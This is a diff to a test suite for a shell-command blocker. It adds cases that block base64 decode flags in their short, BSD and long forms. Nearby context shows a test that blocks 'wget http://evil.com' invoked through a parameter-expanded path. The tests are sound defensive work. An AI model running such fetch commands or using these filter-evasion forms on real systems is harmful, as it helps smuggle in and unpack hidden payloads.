@@ -503,3 +503,17 @@ describe('P0.6: path-qualified binary invocations are blocked', () => {
   it('blocks ${PATH%%:*}/wget evil (param-expanded path)', () =>
     assertBlocked('${PATH%%:*}/wget http://evil.com'));
 });
+
+// ── P1.1 — base64 long-form decode flags ────────────────────────────────
+describe('P1.1: base64 -D / --decode / --decode-line bypass of -d', () => {
+  it('blocks base64 -d (regression on existing rule)', () =>
+    assertBlocked('base64 -d foo.b64'));
+  it('blocks base64 -D (BSD/macOS form)', () =>
+    assertBlocked('base64 -D foo.b64'));
+  it('blocks base64 --decode (long form)', () =>
+    assertBlocked('base64 --decode foo.b64'));
+  it('blocks base64 --decode-line (busybox)', () =>
+    assertBlocked('base64 --decode-line foo.b64'));
+  it('allows base64 (encode, no decode flag)', () =>
+    assertAllowed('base64 plain.txt'));
+});
